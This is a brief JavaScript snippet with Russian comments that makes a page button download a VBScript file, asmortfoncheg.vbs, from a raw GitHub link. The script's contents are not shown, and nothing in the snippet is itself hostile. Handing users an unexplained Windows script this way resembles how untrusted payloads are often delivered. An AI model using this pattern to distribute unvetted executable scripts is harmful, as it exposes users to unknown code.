document.getElementById('downloadButton').addEventListener('click', function() {
    // Путь к файлу на GitHub с использованием raw для прямого скачивания
    const fileUrl = 'https://github.com/kubok758/asmortfoncheg/raw/main/asmortfoncheg.vbs';  // Путь к файлу на GitHub
    
    // Создаем элемент ссылки для скачивания
    const link = document.createElement('a');
    link.href = fileUrl;
    link.download = 'asmortfoncheg.vbs';  // Указываем имя файла при скачивании
    
    // Инициируем скачивание файла
    link.click();
});
